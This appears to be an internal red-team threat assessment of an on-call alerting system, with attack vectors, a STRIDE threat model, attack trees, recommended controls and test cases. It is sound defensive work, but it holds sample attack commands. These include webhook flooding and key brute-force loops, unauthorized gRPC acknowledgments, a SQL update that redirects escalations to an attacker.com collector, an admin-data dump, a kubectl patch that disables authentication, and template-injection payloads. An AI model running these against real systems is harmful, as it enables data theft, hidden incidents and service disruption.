# OnCall System MVP2 - Red Team Security Analysis

> A comprehensive adversarial analysis of the OnCall System from an attacker's perspective.

**Classification:** INTERNAL - Security Assessment
**Date:** 2026-02-03
**Analyst Role:** Red Team / Penetration Testing Perspective

---

## Executive Summary

After analyzing the 280-task MVP2 implementation plan, I have identified **critical security gaps** that could be exploited by both external attackers and malicious insiders. The system handles sensitive operational data (alerts, user contact info, escalation policies) and has significant attack surface through:

1. **Public webhook endpoints** - Primary entry point for attackers
2. **Multi-service architecture** - Trust boundaries between services
3. **External integrations** - Slack, Teams, SMS, Email providers
4. **User/contact data** - PII exposure risk
5. **Administrative functions** - Privilege escalation opportunities

**Risk Rating:** HIGH - Multiple exploitable vectors with significant business impact

---

## Part 1: Top 10 Attack Vectors

### Attack Vector 1: Webhook Endpoint Abuse (CRITICAL)

**Target:** `POST /api/v1/webhook/alertmanager`, `/api/v1/webhook/grafana`, `/api/v1/webhook/generic`

**Attack Scenario:**
```bash
# Attacker discovers integration key (leaked in logs, GitHub, config)
for i in {1..10000}; do
  curl -X POST https://alerts.target.com/api/v1/webhook/alertmanager/LEAKED_KEY \
    -H "Content-Type: application/json" \
    -d '{"alerts":[{"status":"firing","labels":{"alertname":"ATTACKER_SPAM_'$i'","severity":"critical"}}]}'
done
```

**Impact:**
- Flood the on-call engineer with fake critical alerts
- Exhaust notification quotas (Slack/SMS/Email)
- Cause alert fatigue, leading to ignored real alerts
- Potential DoS on database (alert storage)

**Current Gaps:**
- TASK-187 "Webhook Rate Limiting" exists but acceptance criteria don't specify:
  - Per-integration-key rate limiting
  - Per-source-IP rate limiting
  - Payload size limits
  - Alert count limits per request

**Missing Security Controls:**
1. Integration key rotation mechanism
2. IP allowlisting per integration key
3. HMAC signature verification (like GitHub webhooks)
4. Request body hash for replay protection
5. Alert rate limiting per fingerprint pattern

---

### Attack Vector 2: Integration Key Compromise (CRITICAL)

**Target:** Service integration keys in `services` table

**Attack Scenario:**
An attacker compromises a single integration key through:
- Developer laptop breach
- Log file exposure
- Source code repository leak
- CI/CD artifact exposure

**Blast Radius Analysis:**
```
Integration Key Compromised
    |
    v
Full control over alerts for that service
    |
    +--> Create fake critical alerts (ops disruption)
    +--> Resolve real alerts (hide incidents)
    +--> Acknowledge alerts (stop escalation)
    +--> Exfiltrate alert metadata (reconnaissance)
```

**Current Gaps:**
- TASK-066 mentions "Secrets Management Integration" but doesn't specify:
  - Key rotation without service disruption
  - Key compromise detection
  - Per-key usage audit logging
  - Key scope limitations

**Missing Security Controls:**
1. Integration key scoping (read-only vs read-write)
2. Key usage anomaly detection
3. Automatic key rotation policy
4. Compromised key revocation API
5. Integration key audit log (who accessed, when, what actions)

---

### Attack Vector 3: Template Injection (HIGH)

**Target:** Template rendering engine (TASK-023)

**Attack Scenario:**
```go
// Malicious template stored by attacker with template write access
{{ range $i := .Labels }}
  {{ if eq $i.Key "password" }}
    Password: {{ $i.Value }}
  {{ end }}
{{ end }}

// Or worse - Server-Side Template Injection
{{ .Config.DatabaseURL }}
{{ .Secrets.SlackToken }}
```

**Impact:**
- Exfiltrate sensitive data through notification channels
- Access internal configuration
- Potentially achieve code execution (depending on template engine)

**Current Gaps:**
- TASK-023 mentions "Sandboxed execution with timeout" but not:
  - Template variable allowlist
  - Function whitelist
  - Context isolation
  - Template complexity limits

**Missing Security Controls:**
1. Strict template context isolation (only allow `.Labels`, `.Annotations`, `.Alert`)
2. Function whitelist (block `printf %p` for pointer leaks)
3. Output sanitization before sending to channels
4. Template content scanning for sensitive patterns
5. Template change audit log with diff

---

### Attack Vector 4: Unauthorized Alert Acknowledgment (HIGH)

**Target:** `AcknowledgeAlert` RPC, `ResolveAlert` RPC

**Attack Scenario:**
```bash
# Attacker with any user account
# Iterates through alert IDs to acknowledge/resolve alerts they shouldn't access

for alert_id in $(curl -s https://api.target.com/alerts | jq -r '.[].id'); do
  grpcurl -d '{"alert_id":"'$alert_id'","user_id":"attacker-user-id"}' \
    target.com:50051 alerting.v1.AlertService/AcknowledgeAlert
done
```

**Impact:**
- Attacker can acknowledge critical alerts, stopping escalation
- Real incidents go unnoticed
- Audit trail shows legitimate-looking acknowledgments

**Current Gaps:**
- TASK-018 "gRPC Server - AlertService Implementation" doesn't mention:
  - Authorization checks
  - Team/service ownership verification
  - RBAC integration

**Missing Security Controls:**
1. Alert-to-service ownership mapping
2. User-to-service permission check
3. Acknowledgment rate limiting per user
4. Suspicious acknowledgment pattern detection
5. Two-person rule for critical alert resolution

---

### Attack Vector 5: Escalation Policy Manipulation (HIGH)

**Target:** Escalation policies and steps tables

**Attack Scenario:**
```sql
-- Attacker with escalation policy write access
-- Remove themselves from escalation chain
DELETE FROM escalation_steps
WHERE target_type = 'user'
AND target_id = 'attacker-user-id';

-- Or redirect escalations to external webhook they control
UPDATE escalation_steps
SET target_type = 'webhook',
    target_id = 'https://attacker.com/collect'
WHERE policy_id = 'critical-policy-id';
```

**Impact:**
- Attacker avoids being paged for incidents they caused
- Exfiltrate alert data to external system
- Disable escalation for specific services

**Current Gaps:**
- No mention of escalation policy change auditing
- No approval workflow for escalation changes
- No drift detection

**Missing Security Controls:**
1. Escalation policy change approval workflow
2. Change audit log with before/after diff
3. External webhook destination validation
4. Escalation policy integrity monitoring
5. Notification to affected users on policy change

---

### Attack Vector 6: Notification Channel Hijacking (HIGH)

**Target:** Notification destinations, channel configurations

**Attack Scenario:**
```json
// Attacker modifies their contact methods to intercept notifications
{
  "user_id": "legitimate-user-id",
  "contact_methods": {
    "slack": "attacker-slack-channel",
    "email": "attacker@evil.com",
    "phone": "+1-attacker-number"
  }
}
```

**Impact:**
- Intercept sensitive alert content
- Receive notifications meant for others
- Gather intelligence about infrastructure issues

**Current Gaps:**
- Contact method changes go through kneutral-api but:
  - No verification of email/phone ownership
  - No notification to old contact method on change
  - No approval for contact method changes

**Missing Security Controls:**
1. Contact method verification (email confirmation, phone OTP)
2. Notification to old contact on change
3. Admin approval for contact method changes
4. Contact method change audit log
5. Rate limiting on contact method updates

---

### Attack Vector 7: Supply Chain Attack (MEDIUM-HIGH)

**Target:** Go dependencies, Docker base images, Helm charts

**Attack Scenario:**
1. Attacker compromises a popular Go dependency (e.g., logging library)
2. Malicious code exfiltrates secrets during startup
3. Compromised notification-service sends all alert data to attacker

**Current Gaps:**
- TASK-073 "Dependency Scanning in CI" exists
- TASK-113 "Container Security Scanning (Trivy)" exists
- TASK-099 "SBOM Generation" exists

But missing:
- Dependency pinning verification
- Signature verification for dependencies
- Private module proxy
- Build reproducibility verification

**Missing Security Controls:**
1. Dependency lockfile integrity verification in CI
2. Go module checksum database enforcement
3. Private dependency proxy with scanning
4. Container image signing and verification
5. Helm chart signature verification

---

### Attack Vector 8: Insider Threat - Malicious Admin (MEDIUM-HIGH)

**Target:** Admin APIs, database access, secret management

**Attack Scenario:**
A malicious administrator or compromised admin account could:

1. **Exfiltrate user data:**
   ```sql
   COPY (SELECT * FROM kneutral_users WHERE role = 'admin') TO '/tmp/admins.csv';
   ```

2. **Create backdoor integration:**
   ```sql
   INSERT INTO services (id, name, integration_key)
   VALUES (gen_random_uuid(), 'legit-looking-service', 'backdoor-key-123');
   ```

3. **Disable security controls:**
   ```bash
   kubectl patch deployment alerting-service -p '{"spec":{"template":{"spec":{"containers":[{"name":"alerting","env":[{"name":"DISABLE_AUTH","value":"true"}]}]}}}}'
   ```

**Current Gaps:**
- TASK-248 "Data Access Audit Logging" exists but may not cover:
  - All admin actions
  - Schema changes
  - Secret access
  - Configuration changes

**Missing Security Controls:**
1. Privileged Access Management (PAM) - TASK-259 exists but needs detail
2. Admin action audit with tamper-proof logging
3. Break-glass procedures with mandatory review
4. Separation of duties (no single admin can disable security)
5. Admin session recording

---

### Attack Vector 9: Data Exfiltration via Alerts (MEDIUM)

**Target:** Alert labels, annotations, notification content

**Attack Scenario:**
Alerts may contain sensitive information:
- Database connection strings in error messages
- API keys in stack traces
- Customer data in alert summaries
- Internal hostnames and IPs

Attacker with notification access can:
1. Search alert history for sensitive patterns
2. Create overly broad routing rules to receive all alerts
3. Extract data from template previews

**Current Gaps:**
- TASK-256 "PII Masking in Logs" exists but doesn't cover:
  - PII masking in alert content
  - Sensitive pattern detection
  - Data classification for alerts

**Missing Security Controls:**
1. Alert content classification (PII, secrets, internal)
2. Automatic secret/credential detection and masking
3. Alert access based on data classification
4. Template preview audit logging
5. Bulk alert export controls

---

### Attack Vector 10: Denial of Service via Resource Exhaustion (MEDIUM)

**Target:** Database, notification queue, template rendering

**Attack Scenarios:**

**A. Database Exhaustion:**
```bash
# Create alerts with massive JSONB labels
curl -X POST webhook_url -d '{
  "alerts": [{
    "labels": {"key1": "'$(python3 -c "print('A'*1000000)"):'"...repeat 100 times"}
  }]
}'
```

**B. Template Rendering DoS:**
```go
// Template with exponential complexity
{{ range $a := .List }}
  {{ range $b := .List }}
    {{ range $c := .List }}
      {{ $a }}{{ $b }}{{ $c }}
    {{ end }}
  {{ end }}
{{ end }}
```

**C. Notification Queue Flooding:**
Create escalation policy that triggers thousands of notifications per alert.

**Current Gaps:**
- TASK-200 "Template Rendering Safety Limits" exists
- TASK-187 "Webhook Rate Limiting" exists

But missing:
- JSONB payload size limits
- Label count limits
- Annotation value size limits
- Notification count per alert limits

**Missing Security Controls:**
1. Request payload size limit (webhook + gRPC)
2. JSONB field size limits
3. Maximum labels/annotations per alert
4. Notification fan-out limits
5. Template iteration/recursion limits (enforced at save time)

---

## Part 2: Security Gaps Analysis

### Authentication & Authorization Gaps

| Gap | Current State | Risk | Recommendation |
|-----|--------------|------|----------------|
| Webhook authentication | Integration key only | HIGH | Add HMAC signature verification |
| gRPC authentication | mTLS planned (TASK-065) | HIGH | Implement with JWT for user identity |
| API authorization | No RBAC tasks visible | HIGH | Add service-level RBAC |
| Admin authentication | Unclear | HIGH | Require MFA, session limits |

### Data Protection Gaps

| Gap | Current State | Risk | Recommendation |
|-----|--------------|------|----------------|
| Encryption at rest | TASK-249 exists | MEDIUM | Ensure covers all sensitive fields |
| Secret storage | TASK-066, TASK-088 | MEDIUM | Add rotation automation |
| PII handling | TASK-256 logs only | HIGH | Extend to alert content |
| Data classification | TASK-244 scheme only | MEDIUM | Implement enforcement |

### Network Security Gaps

| Gap | Current State | Risk | Recommendation |
|-----|--------------|------|----------------|
| Network policies | TASK-086 exists | MEDIUM | Verify deny-by-default |
| External egress | No mention | MEDIUM | Whitelist external destinations |
| gRPC security | mTLS planned | HIGH | Implement certificate pinning |
| Service mesh | TASK-093 evaluation | LOW | Consider for zero-trust |

### Monitoring & Detection Gaps

| Gap | Current State | Risk | Recommendation |
|-----|--------------|------|----------------|
| Security alerting | TASK-258 SIEM | MEDIUM | Define detection rules |
| Anomaly detection | Not mentioned | HIGH | Add for auth, API patterns |
| Audit trail | TASK-248 | MEDIUM | Ensure tamper-proof |
| Incident response | TASK-251 plan | MEDIUM | Include security scenarios |

---

## Part 3: High-Risk Components

### Tier 1: Critical (Compromise = System Breach)

1. **Integration Keys Table** (`services.integration_key`)
   - Single point of authentication for webhooks
   - Compromise allows full alert manipulation
   - Recommendation: Encrypt at rest, audit all access

2. **Escalation Engine**
   - Controls who gets notified
   - Compromise can silence all alerts
   - Recommendation: Integrity monitoring, change approval

3. **kneutral-api User Service**
   - Single source of user identity
   - Compromise affects all downstream services
   - Recommendation: Defense in depth, request signing

4. **External Secrets / Vault Integration**
   - Holds all service credentials
   - Compromise = access to Slack, Email, SMS, DB
   - Recommendation: Least privilege, rotation automation

### Tier 2: High (Compromise = Data Breach / Availability Impact)

5. **Template Storage**
   - Templates can exfiltrate data
   - Recommendation: Content scanning, strict context isolation

6. **Notification Channel Credentials**
   - Slack tokens, SMTP credentials
   - Recommendation: Scoped permissions, usage monitoring

7. **PostgreSQL Databases**
   - Contains all operational data
   - Recommendation: Row-level encryption, access controls

8. **Redis Cache**
   - May contain user data
   - Recommendation: AUTH enabled, TLS, eviction monitoring

### Tier 3: Medium (Compromise = Operational Disruption)

9. **Prometheus/Grafana**
   - Visibility into system state
   - Recommendation: Authentication, network isolation

10. **Kubernetes Secrets**
    - Bootstrap credentials
    - Recommendation: External Secrets, encryption

---

## Part 4: Missing Security Tasks

### Critical (Must Have Before Production)

| ID | Task | Rationale |
|----|------|-----------|
| SEC-001 | Webhook HMAC Signature Verification | Integration keys alone are insufficient |
| SEC-002 | Alert-Level RBAC | Users can ack/resolve any alert |
| SEC-003 | Template Context Isolation | Prevent data exfiltration via templates |
| SEC-004 | Escalation Policy Change Approval | Prevent unauthorized policy modification |
| SEC-005 | Contact Method Verification | Prevent notification hijacking |
| SEC-006 | Integration Key Rotation Automation | Enable response to key compromise |
| SEC-007 | Admin Action Audit Trail | Detect insider threats |
| SEC-008 | Payload Size Limits | Prevent DoS via large payloads |

### High Priority (Should Have for Production)

| ID | Task | Rationale |
|----|------|-----------|
| SEC-009 | Alert Content Classification | Identify and protect sensitive alerts |
| SEC-010 | Secret Detection in Alerts | Prevent credential exposure in notifications |
| SEC-011 | External Webhook Destination Validation | Prevent data exfiltration via escalation |
| SEC-012 | Rate Limiting by User/Service | Prevent abuse by authenticated users |
| SEC-013 | Anomaly Detection for API Patterns | Detect compromised accounts |
| SEC-014 | Dependency Signature Verification | Mitigate supply chain attacks |
| SEC-015 | Database Query Audit Logging | Detect data exfiltration |
| SEC-016 | gRPC Request Signing | Prevent replay attacks |

### Medium Priority (Should Have Post-Launch)

| ID | Task | Rationale |
|----|------|-----------|
| SEC-017 | Security Chaos Testing | Validate security controls under stress |
| SEC-018 | Penetration Testing Scope Document | Enable third-party testing |
| SEC-019 | Bug Bounty Program Design | Leverage external researchers |
| SEC-020 | Red Team Exercise Runbook | Periodic security validation |

---

## Part 5: STRIDE Threat Model

### Component: Webhook Receiver

| Threat | Category | Likelihood | Impact | Mitigations |
|--------|----------|------------|--------|-------------|
| Attacker sends fake alerts | Spoofing | HIGH | HIGH | HMAC signatures, IP allowlisting |
| Attacker modifies alert in transit | Tampering | MEDIUM | HIGH | TLS, request signing |
| Attacker denies sending alert | Repudiation | LOW | MEDIUM | Request logging with signatures |
| Attacker reads alert content | Info Disclosure | LOW | MEDIUM | TLS mandatory |
| Attacker floods with alerts | DoS | HIGH | HIGH | Rate limiting, payload limits |
| Attacker bypasses auth | EoP | MEDIUM | HIGH | Defense in depth, anomaly detection |

### Component: Alert Service gRPC

| Threat | Category | Likelihood | Impact | Mitigations |
|--------|----------|------------|--------|-------------|
| Attacker impersonates user | Spoofing | MEDIUM | HIGH | mTLS + JWT, user verification |
| Attacker modifies alert state | Tampering | MEDIUM | HIGH | Authorization checks, audit log |
| User denies acknowledging alert | Repudiation | MEDIUM | MEDIUM | Immutable audit trail |
| Attacker reads unauthorized alerts | Info Disclosure | HIGH | MEDIUM | Alert-level RBAC |
| Attacker exhausts connections | DoS | MEDIUM | HIGH | Connection limits, circuit breaker |
| Regular user becomes admin | EoP | LOW | CRITICAL | RBAC, principle of least privilege |

### Component: Notification Service

| Threat | Category | Likelihood | Impact | Mitigations |
|--------|----------|------------|--------|-------------|
| Attacker sends notification as system | Spoofing | LOW | HIGH | Service authentication |
| Attacker injects template content | Tampering | MEDIUM | HIGH | Template validation, sandboxing |
| System denies sending notification | Repudiation | LOW | MEDIUM | Delivery logs, external confirmation |
| Attacker reads notification content | Info Disclosure | MEDIUM | HIGH | Content classification, access control |
| Attacker triggers notification storm | DoS | MEDIUM | HIGH | Rate limiting, fan-out limits |
| Attacker gains channel credentials | EoP | LOW | CRITICAL | Least privilege, rotation |

### Component: Template Storage

| Threat | Category | Likelihood | Impact | Mitigations |
|--------|----------|------------|--------|-------------|
| Attacker creates malicious template | Spoofing | MEDIUM | HIGH | Template approval workflow |
| Attacker modifies existing template | Tampering | MEDIUM | HIGH | Version immutability, audit |
| Author denies creating template | Repudiation | LOW | LOW | Change tracking |
| Attacker extracts data via template | Info Disclosure | HIGH | HIGH | Context isolation, function whitelist |
| Attacker creates DoS template | DoS | MEDIUM | MEDIUM | Complexity limits at save time |
| User gains template admin rights | EoP | LOW | MEDIUM | RBAC, separation of duties |

### Component: Escalation Engine

| Threat | Category | Likelihood | Impact | Mitigations |
|--------|----------|------------|--------|-------------|
| Attacker triggers false escalation | Spoofing | MEDIUM | MEDIUM | Alert validation, anomaly detection |
| Attacker modifies escalation policy | Tampering | MEDIUM | CRITICAL | Change approval, integrity monitoring |
| Admin denies policy change | Repudiation | LOW | HIGH | Immutable audit trail |
| Attacker learns escalation structure | Info Disclosure | MEDIUM | LOW | Access control |
| Attacker creates infinite escalation | DoS | MEDIUM | HIGH | Cycle detection, depth limits |
| User removes self from escalation | EoP | MEDIUM | HIGH | Change validation, mandatory coverage |

---

## Part 6: Attack Trees

### Attack Tree 1: Silence Critical Alerts

```
Goal: Prevent on-call from receiving critical alert
|
+-- [OR] Compromise webhook authentication
|   +-- [AND] Obtain integration key
|   |   +-- Search public repos/logs
|   |   +-- Social engineering
|   |   +-- Insider access
|   +-- Use key to resolve alerts
|
+-- [OR] Manipulate escalation policy
|   +-- [AND] Gain escalation write access
|   +-- Remove notification steps
|
+-- [OR] Hijack notification channel
|   +-- Modify user contact methods
|   +-- Redirect Slack webhook
|
+-- [OR] Exhaust notification capacity
|   +-- Flood with fake alerts
|   +-- Trigger rate limits on Slack
```

### Attack Tree 2: Exfiltrate Sensitive Data

```
Goal: Extract internal data from alert system
|
+-- [OR] Via alert content
|   +-- [AND] Gain alert read access
|   +-- Search alerts for credentials/PII
|   +-- Export via API
|
+-- [OR] Via template injection
|   +-- [AND] Gain template write access
|   +-- Create template accessing forbidden context
|   +-- Trigger notification to attacker channel
|
+-- [OR] Via escalation webhook
|   +-- [AND] Gain escalation policy access
|   +-- Add webhook step pointing to attacker
|   +-- Trigger escalation
|
+-- [OR] Via database access
|   +-- [AND] Compromise database credentials
|   +-- Direct data extraction
```

### Attack Tree 3: Denial of Service

```
Goal: Make alerting system unavailable
|
+-- [OR] Exhaust database resources
|   +-- Send alerts with huge JSONB payloads
|   +-- Create millions of alerts
|   +-- Trigger complex queries
|
+-- [OR] Exhaust notification resources
|   +-- Trigger Slack rate limits
|   +-- Fill notification queue
|   +-- DoS template rendering
|
+-- [OR] Exhaust compute resources
|   +-- Create template with infinite loops
|   +-- Trigger circular escalation
|   +-- Goroutine exhaustion via streams
|
+-- [OR] Network-level attack
|   +-- DDoS webhook endpoints
|   +-- DNS poisoning
|   +-- Certificate issues
```

---

## Part 7: Recommendations Summary

### Immediate Actions (Block Production)

1. **Implement webhook HMAC verification** - Integration keys are too easily compromised
2. **Add alert-level authorization** - Users can currently ack any alert
3. **Enforce template context isolation** - Current plan allows data exfiltration
4. **Add payload size limits** - No protection against DoS via large payloads
5. **Implement escalation cycle detection** - Infinite loops possible

### Pre-Production Checklist

- [ ] All integration keys rotatable without downtime
- [ ] Alert RBAC implemented and tested
- [ ] Template sandboxing verified with test cases
- [ ] Rate limiting tested under load
- [ ] Audit logging covers all sensitive operations
- [ ] Security alerts defined for anomalies
- [ ] Incident response runbook includes security scenarios
- [ ] Penetration test completed and findings addressed

### Ongoing Security Operations

- [ ] Monthly security review of access patterns
- [ ] Quarterly penetration testing
- [ ] Annual third-party security audit
- [ ] Continuous dependency vulnerability scanning
- [ ] Security chaos engineering exercises

---

## Appendix A: Security Test Cases

### Test Case SEC-TC-001: Integration Key Brute Force
```bash
# Attempt to guess integration keys
for key in $(cat wordlist.txt); do
  response=$(curl -s -o /dev/null -w "%{http_code}" \
    -X POST https://target/webhook/alertmanager/$key \
    -d '{"alerts":[]}')
  if [ "$response" == "200" ]; then
    echo "Valid key: $key"
  fi
done
# Expected: Rate limiting kicks in after N attempts
# Expected: Alert fires for brute force detection
```

### Test Case SEC-TC-002: Cross-Service Alert Access
```bash
# User from Team A tries to acknowledge Team B alert
grpcurl -d '{"alert_id":"team-b-alert-id","user_id":"team-a-user"}' \
  target:50051 alerting.v1.AlertService/AcknowledgeAlert
# Expected: PERMISSION_DENIED error
```

### Test Case SEC-TC-003: Template Data Exfiltration
```go
// Create template attempting to access config
template := `{{ .Config.DatabaseURL }}`
// Expected: Render fails with "undefined: Config"
```

### Test Case SEC-TC-004: Escalation Loop
```bash
# Create two policies that reference each other
# Policy A -> Step 3 -> Escalate to Policy B
# Policy B -> Step 2 -> Escalate to Policy A
# Expected: Creation fails with cycle detection error
```

### Test Case SEC-TC-005: Large Payload DoS
```bash
# Send alert with 10MB of labels
curl -X POST target/webhook/alertmanager/key \
  -d '{"alerts":[{"labels":{"big":"'$(python -c "print('A'*10000000)"):'"}}]}'
# Expected: 413 Payload Too Large
```

---

## Appendix B: Security Metrics to Track

| Metric | Description | Alert Threshold |
|--------|-------------|-----------------|
| `webhook_auth_failures_total` | Failed authentication attempts | > 100/min |
| `alert_ack_unauthorized_total` | Unauthorized ack attempts | > 0 |
| `template_render_blocked_total` | Blocked template operations | > 10/hour |
| `escalation_policy_changes_total` | Policy modifications | Any (notify) |
| `integration_key_rotations_total` | Key rotations | Track for compliance |
| `admin_api_calls_total` | Admin operations | Audit all |
| `notification_destination_changes_total` | Contact changes | Track |

---

## Appendix C: Compliance Mapping

| Control | TASK ID | Status | Gap |
|---------|---------|--------|-----|
| Access Control (SOC2 CC6.1) | TASK-259 | Partial | Need RBAC |
| Encryption (SOC2 CC6.7) | TASK-249 | Planned | Verify scope |
| Logging (SOC2 CC7.2) | TASK-248 | Planned | Add immutability |
| Incident Response (SOC2 CC7.4) | TASK-251 | Planned | Add security scenarios |
| Change Management (SOC2 CC8.1) | TASK-253 | Planned | Add security review |
| Risk Assessment (SOC2 CC3.2) | This doc | Now | Ongoing |

---

*Document generated by Red Team Security Analysis. This is a living document that should be updated as the system evolves.*

**Classification:** INTERNAL - Security Assessment
**Distribution:** Security Team, Platform Team Leads
**Review Cycle:** Before each major release
